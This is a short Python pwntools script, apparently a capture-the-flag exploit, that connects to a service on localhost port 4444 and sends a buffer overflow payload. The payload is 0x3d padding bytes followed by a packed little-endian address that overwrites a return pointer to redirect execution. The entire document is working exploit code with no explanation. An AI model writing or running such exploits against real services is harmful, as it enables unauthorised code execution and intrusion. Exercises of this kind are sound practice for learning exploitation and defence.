from pwn import *
import struct

context.terminal = ['tilix', '-e']

c = remote('localhost', 4444)
c.recvline();
c.recvline();
c.sendline(b'a'*0x3d + struct.pack("<Q", 0x0001059e))
print(c.recvline())
